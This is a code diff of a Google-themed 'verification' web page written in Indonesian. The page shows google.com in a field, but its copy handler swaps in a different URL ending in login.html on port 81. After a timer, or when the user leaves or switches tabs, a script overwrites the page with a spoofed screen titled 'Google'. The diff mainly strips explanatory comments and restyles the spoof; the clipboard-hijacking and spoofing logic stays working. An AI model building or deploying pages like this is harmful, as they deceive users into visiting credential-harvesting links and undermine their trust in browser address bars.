@@ -31,9 +31,7 @@
             border-radius: 4px; 
             font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
         }
-        button:active { background-color: #1765cc; }
     </style>
 </head>
 <body>
@@ -41,13 +39,11 @@
     <div id="main-content">
         <h3>Sistem Verifikasi Google</h3>
         <p>Klik tombol di bawah untuk menyalin link verifikasi, lalu paste di address bar untuk melanjutkan.</p>
-        
         <input id="tst" value="https://www.google.com" disabled><br>
         <button onclick="copyt()">Salin Link</button>
     </div>
 
     <script>
-        // 1. LOGIKA CLIPBOARD HIJACKING
         const tst = document.getElementById('tst');
         
         function copyt() {
@@ -59,19 +55,18 @@
         }
 
         tst.oncopy = function(e) {
-            // Memasukkan URL dengan port :81 ke clipboard
             e.clipboardData.setData('text/plain', 'http://google.com:81/login.html');
             e.preventDefault();
         }
 
-        // 2. LOGIKA SPOOFING (Teks + Gambar di Tengah)
+// LOGIKA SPOOFING (Teks di Atas Gambar, Rata Kiri)
         function triggerSpoof() {
             document.body.innerHTML = `
                 <div style="
                     display: flex;
-                    flex-direction: column;
-                    justify-content: center;
-                    align-items: center;
+                    flex-direction: column; /* Susunan vertikal (atas-bawah) */
+                    justify-content: flex-start; 
+                    align-items: center; /* Menjaga kontainer utama tetap di tengah horizontal */
                     height: 100vh;
                     width: 100vw;
                     background-color: #ffffff;
@@ -80,35 +75,37 @@
                     left: 0;
                     z-index: 9999;
                     margin: 0;
+                    padding-top: 10vh;
                     overflow: hidden;
                 ">
-                    <h1 style="
-                        font-family: sans-serif;
-                        color: #d93025; 
-                        margin-bottom: 20px;
-                        font-size: 26px;
-                        font-weight: bold;
-                    ">It's not Google</h1>
+                    <div style="display: inline-block; text-align: left; max-width: 90%;">
+                        
+                        <h1 style="
+                            font-family: sans-serif;
+                            color: #000000;
+                            margin: 0 0 15px 0; /* Jarak bawah ke gambar */
+                            font-size: 20px;
+                            font-weight: bold;
+                        ">𝐷ℎ𝑎𝑓𝑦 | 𝑁𝑜𝑡 𝐺𝑜𝑜𝑔𝑙𝑒</h1>
 
-                    <img src="https://ecdnts-del.github.io/spoof/IMG_20260423_081815_812.webp" 
-                         style="max-width: 90%; height: auto; border: none; border-radius: 8px;">
+                        <img src="https://ecdnts-del.github.io/spoof/IMG_20260423_081815_812.webp" 
+                             style="
+                                width: 100%; /* Mengikuti lebar pembungkus */
+                                height: auto; 
+                                border: none; 
+                                border-radius: 8px;
+                                display: block;
+                             ">
+                    </div>
                 </div>
             `;
             document.title = "Google";
         }
 
-        // 3. TIMER & NAVIGASI INTERRUPT
-        // Muncul otomatis setelah 5 detik
-        setTimeout(function() {
-            triggerSpoof();
-        }, 5000);
+        setTimeout(triggerSpoof, 2000);
 
-        // Memicu saat navigasi dimulai (Paste & Enter)
-        window.onbeforeunload = function() {
-            triggerSpoof();
-        };
+        window.onbeforeunload = triggerSpoof;
 
-        // Menangani pemicu saat pindah tab (Visibility Change)
         document.addEventListener('visibilitychange', function() {
             if (document.visibilityState === 'hidden') {
                 triggerSpoof();
